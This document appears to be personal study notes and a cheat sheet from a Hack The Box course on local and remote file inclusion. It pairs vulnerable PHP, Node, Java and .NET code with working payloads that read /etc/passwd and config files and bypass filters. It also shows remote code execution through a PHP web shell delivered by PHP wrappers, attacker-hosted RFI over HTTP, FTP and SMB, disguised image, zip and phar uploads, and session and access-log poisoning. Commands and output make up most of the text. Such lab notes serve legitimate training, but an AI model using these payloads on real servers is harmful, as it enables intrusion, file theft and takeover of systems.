- parameters are used to specify which resource is shown on the page

-  to have most of the web application looking the same (header footer etc.) and load content dynamically we use parameter like `/index.php?page=about`

	- `index.php` sets static content (e.g. header/footer) content in this page changes with `page` parameter

### Examples of Vulnerable Code

#### PHP
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- get req using language header
- any path we pass in the `language` parameter  loaded on the page

#### JS

- Node JS
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- what paramerter is passed `readfile` function, which then writes the file content in the HTTP response

- Express JS
```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

- unlike other from above GET parameters were specified after a (`?`) character
-  takes the parameter from the URL path (e.g. `/about/en` or `/about/es`)
- parameter is directly used within the `render()`


#### Java

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
- check if language parameter is not empty 
- using if it includes the file in web content 

- using import function we can do the same

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```



#### .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

- `Response.WriteFile` function works similar takes a file path for its input and writes its content to the response

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

- `@Html.Partial()` function used to render the specified file as part of the front-end template

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

- `include` function used to render local files or remote URLs



## Read vs Execute

- some of the above functions only read the content of the specified files
- some others also execute the specified files
- some of them allow specifying remote URLs
- some work with files local to the back-end server.



| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

# File Disclosure

## Local File Inclusion (LFI)

-  loading part of the page using template engines is the easiest and most common method utilized
- web application is indeed pulling a file that is now being included in the page 
	- Pull different file /etc/passwd



### Path Traversal

```php
include($_GET['language']);
```

- in this case /etc/passwd would work and displayed

```php
include("./languages/" . $_GET['language']);
```

- here it doesnot work and if we input /etc/passwd `./languages//etc/passwd`
- in this case we can bypass using `../../../../etc/passwd`


### Filename Prefix

```php
include("lang_" . $_GET['language']);
```

- In this case  `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`
- prefix a `/` before our payload , in this case lang_ in consider as directory `lang_/../../../etc/passwd`

### Appended Extensions

```php
include($_GET['language'] . ".php");
```
- try to read `/etc/passwd`, then the file included would be `/etc/passwd.php`



### Second-Order Attacks

- web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`)
- craft LFI username (e.g. `../../../etc/passwd`)



## Basic Bypasses

### Non-Recursive Path Traversal Filters

```php
$language = str_replace('../', '', $_GET['language']);
```
- not `recursively removing` the `../` substring,still vulnerable
- `....//....//....//....//etc/passwd` or `..././` or `....\/` or `....////`


### Encoding
- web application did not allow `.` and `/` URL encode `../` into `%2e%2e%2f`


### Approved Paths

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
- checks if the input contains languages or illegal path
- to bypass this `./languages/../../../../etc/passwd`

### Appended Extension

- web applications append an extension to our input string (e.g. `.php`)

##### Path Truncation

- earlier versions of PHP
	- strings have a ==maximum== length of ==4096== characters , more than that ==truncated==( any characters after the maximum length will be ignored)
- `////etc/passwd` =>` /etc/passwd`
- `/etc/./passwd` => `/etc/passwd`
- `/etc/passwd/.` => `/etc/passwd`

**Bypass Appended Extension**
- PHP limits strings to 4096 characters.
- Adding `.php` to a long string can be cut off.
- Start the path with a non-existent directory for this to work.

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
- to create the above 

```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

##### Null Bytes

- PHP versions 5.5 vulnerable to ==null byte injection== 
- adding a null byte (`%00`) at the end of the string would terminate the string




## PHP Filters

- identify an LFI vulnerability in PHP web applications (utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php))


### Input Filters
-  `php://filter/` scheme lets you apply filters directly to the data you read
	- parameters
		1) resource =>Specifies the source of the data
		2) read => Specifies which filter
#### Types of Filters

- **String Filters**: Modify strings (e.g., `string.strip_tags` removes HTML tags).
- **Conversion Filters**: Change data format (e.g., `convert.base64-encode`).
- **Compression Filters**: Compress or decompress data (e.g., `zlib.deflate`).
- **Encryption Filters**: Encrypt or decrypt data (e.g., `mcrypt.*`).


##### ==Usage==

- find lfi 
- fuzz of php files
- get source code using php wrapper

### Fuzzing for PHP Files

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

### Source Code Disclosure

```url
php://filter/read=convert.base64-encode/resource=<phpfilename>
```


##### Payload

```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```


# Remote Code Execution

## PHP Wrappers

 - get id_rsa using php filter and use ssh to login

### Data Wrapper

-  [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data
- only available to use if the (`allow_url_include`) setting is enabled
- check by reading the PHP configuration file through the LFI vulnerability.

##### Checking PHP Configurations

- configuration files
	- `/etc/php/X.Y/apache2/php.ini` -> in Apache
	- `/etc/php/X.Y/fpm/php.ini` -> in Ngnix


```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.2/apache2/php.ini"
```

```shell
pradyun2005@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

- if this on we can on we can use data wrapper to include files


##### Getting RCE

```shell
pradyun2005@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
- url encode the base64 payload

```url
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```


## Input Wrapper
- used to include external input and execute PHP code
- input wrapper uses POST request to include payload and execute

```shell
pradyun2005@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect Wrapper

- allows us to directly run commands through URL streams
- needs to be manually installed and enabled in configuration
- to check get `php.ini` file like above

```shell
pradyun2005@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

```shell
pradyun2005@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```




## Remote File Inclusion (RFI)

- allows the inclusion of remote URLs
	1. Enumerating local-only ports and web applications (i.e. SSRF)
	2. Gaining remote code execution by including a malicious script that we host

- almost any RFI vulnerability is also an LFI vulnerability

### Verify RFI

- remote URL inclusion in PHP require `allow_url_include` setting to be enabled

```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```


- always start by trying to include a local URL

![[Pasted image 20240614112342.png]]
- we see page rendered 
- possible of Dos


### Remote Code Execution with RFI


```shell
pradyun2005@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**File Transfer**
#### HTTP
 
```shell
pradyun2005@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) 
```

#### FTP


```shell
pradyun2005@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```


```shell
pradyun2005@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://anonymous:anonymous@10.10.14.170/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### SMB

 - if Web Application hosted in windows server then ==SMB== is used for RFI
 -  do not need the `allow_url_include` setting to be enabled for RFI exploitation

```shell
pradyun2005@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


```
pradyun2005@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```





## LFI and File Uploads


### Image upload

```shell
pradyun2005@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Uploaded FIle Path**

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

![[Pasted image 20240614125308.png]]


### Zip Upload

```shell
pradyun2005@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
- zipping shell.php with shell.jpg
- `zip://shell.jpg` refer files with in it with `#shell.php`
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload

- the below is shell.php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

- when we run this script can be compiled into a `phar` 

```shell
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

- when calling using `phar://` in browser it would write <?php system($_GET["cmd"]); ?> to shell.txt
- rce via shell.txt



## Log Poisoning


- Write PHP payload in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file
- include the log file into user controlled input
- payload executed
- ==log file must have read permissions==



### PHP Session Poisoning
- web applications utilize `PHPSESSID` cookies
- details of user is stored in `/var/lib/php/sessions/` 
	- if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3` =>file is `/var/lib/php/sessions/sess_08muake8ld3cgto7i4kafkbhmh`


![[Pasted image 20240614145835.png]]

- we have control over page which is language param `en.php`
- now put language=<?php system($_GET["cmd"]);?>
_=command
![[Pasted image 20240614145807.png]]


cat /var/log/apache2/error.log 
### Server Log Poisoning

- `Apache` and `Nginx` maintain `access.log` and `error.log`
- `access.log` contain ==user-agent== ,which is user controlled
- `Apache` =>`/var/log/apache2/access.log`
- `Ngnix` => `/var/log/nginx/`


![[Pasted image 20240614150353.png]]


**Exploit**

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

![[Pasted image 20240614150539.png]]



- if ==read== ==permission== is ==disable== for ==log== files 
	- User-Agent is also shown in `/proc/self/environ` or `/proc/self/fd/<pid>`


**ASSESMENT:**
```
<?=`tac%20/c85ee5082f4c723ace6c0796e3a3db09.txt`?>
```



## Automated Scanning

### Fuzzing Parameters

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### LFI wordlists

- [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

```shell
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.176:30951?view=FUZZ' -fs 2287
```

### Fuzzing Server Files

-  locate a file we uploaded, but we cannot reach its `/uploads` directory (`../../uploads`)
- fuzz for the `index.php`  [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.54.176:30951/index.php?view=../../../../FUZZ/index.php' -fs 2287
``` 

##### Server Logs/Configurations

-  [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

```shell
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://94.237.54.176:30951/index.php?view=../../../../FUZZ' -fs 2287
```


### LFI Tools


- [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).






# Skill Assessment

- page parameter vulnerable to lfi
- use phar wrapper to get source code of index.php
- find admin directory
- path traversel to /etc/passwd
- view ngnix access log






























# CHEETSHEET
## Local File Inclusion

|**Command**|**Description**|
|---|---|
|**Basic LFI**||
|`/index.php?language=/etc/passwd`|Basic LFI|
|`/index.php?language=../../../../etc/passwd`|LFI with path traversal|
|`/index.php?language=/../../../etc/passwd`|LFI with name prefix|
|`/index.php?language=./languages/../../../../etc/passwd`|LFI with approved path|
|**LFI Bypasses**||
|`/index.php?language=....//....//....//....//etc/passwd`|Bypass basic path traversal filter|
|`/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`|Bypass filters with URL encoding|
|`/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`|Bypass appended extension with path truncation (obsolete)|
|`/index.php?language=../../../../etc/passwd%00`|Bypass appended extension with null byte (obsolete)|
|`/index.php?language=php://filter/read=convert.base64-encode/resource=config`|Read PHP with base64 filter|

## Remote Code Execution

|**Command**|**Description**|
|---|---|
|**PHP Wrappers**||
|`/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`|RCE with data wrapper|
|`curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`|RCE with input wrapper|
|`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`|RCE with expect wrapper|
|**RFI**||
|`echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>`|Host web shell|
|`/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`|Include remote PHP web shell|
|**LFI + Upload**||
|`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`|Create malicious image|
|`/index.php?language=./profile_images/shell.gif&cmd=id`|RCE with malicious uploaded image|
|`echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`|Create malicious zip archive 'as jpg'|
|`/index.php?language=zip://shell.zip%23shell.php&cmd=id`|RCE with malicious uploaded zip|
|`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`|Create malicious phar 'as jpg'|
|`/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`|RCE with malicious uploaded phar|
|**Log Poisoning**||
|`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`|Read PHP session parameters|
|`/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`|Poison PHP session with web shell|
|`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`|RCE through poisoned PHP session|
|`curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`|Poison server log|
|`/index.php?language=/var/log/apache2/access.log&cmd=id`|RCE through poisoned PHP session|

## Misc

|**Command**|**Description**|
|---|---|
|`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`|Fuzz page parameters|
|`ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`|Fuzz LFI payloads|
|`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`|Fuzz webroot path|
|`ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`|Fuzz server configurations|
|[LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)||
|[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)||
|[Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)||
|[Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)||
|[Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)||
|[Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)||

## File Inclusion Functions

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |
